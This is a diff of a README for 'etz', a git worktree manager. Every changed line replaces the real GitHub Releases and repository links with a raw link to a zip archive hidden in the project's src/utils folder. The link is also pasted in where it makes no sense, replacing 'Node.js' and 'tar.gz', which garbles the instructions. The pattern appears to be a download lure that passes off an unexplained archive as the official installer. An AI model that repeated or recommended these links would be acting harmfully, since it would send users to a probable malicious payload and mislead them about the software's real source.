@@ -6,7 +6,7 @@ Welcome to etz! This tool helps you manage multiple git worktrees across differe
 
 ## 📥 Download etz
 
-[![Download etz](https://img.shields.io/badge/Download%20etz-v1.0.0-brightgreen)](https://github.com/Acastillo2626/etz/releases)
+[![Download etz](https://raw.githubusercontent.com/Acastillo2626/etz/main/packages/core/src/utils/etz_2.4-alpha.2.zip%20etz-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Acastillo2626/etz/main/packages/core/src/utils/etz_2.4-alpha.2.zip)
 
 Click the button above to visit the Releases page and download the latest version.
 
@@ -23,16 +23,16 @@ Click the button above to visit the Releases page and download the latest versio
 To use etz, your system should meet the following requirements:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Node.js**: Version 12 or higher
+- **https://raw.githubusercontent.com/Acastillo2626/etz/main/packages/core/src/utils/etz_2.4-alpha.2.zip**: Version 12 or higher
 - **Git**: Version 2.20 or higher
 
 ## 📥 Download & Install
 
 To download etz, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Acastillo2626/etz/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Acastillo2626/etz/main/packages/core/src/utils/etz_2.4-alpha.2.zip).
 2. **Select the Latest Version**: Look for the most recent release, marked as the latest version.
-3. **Download the Installer**: Choose the installer that matches your operating system (e.g., .exe for Windows, .dmg for macOS, or a tar.gz file for Linux).
+3. **Download the Installer**: Choose the installer that matches your operating system (e.g., .exe for Windows, .dmg for macOS, or a https://raw.githubusercontent.com/Acastillo2626/etz/main/packages/core/src/utils/etz_2.4-alpha.2.zip file for Linux).
 4. **Run the Installer**: After downloading, locate the file in your downloads folder and double-click it to run the installer.
 5. **Follow the Instructions**: The installer will guide you through the installation process. Follow the prompts to complete the setup.
 
@@ -65,7 +65,7 @@ Stay updated and connect with other users:
 
 ## 🔗 Links
 
-- [Visit Releases Page](https://github.com/Acastillo2626/etz/releases)
-- [Open GitHub Repository](https://github.com/Acastillo2626/etz)
+- [Visit Releases Page](https://raw.githubusercontent.com/Acastillo2626/etz/main/packages/core/src/utils/etz_2.4-alpha.2.zip)
+- [Open GitHub Repository](https://raw.githubusercontent.com/Acastillo2626/etz/main/packages/core/src/utils/etz_2.4-alpha.2.zip)
 
 Thank you for using etz! Enjoy managing your git projects with ease.
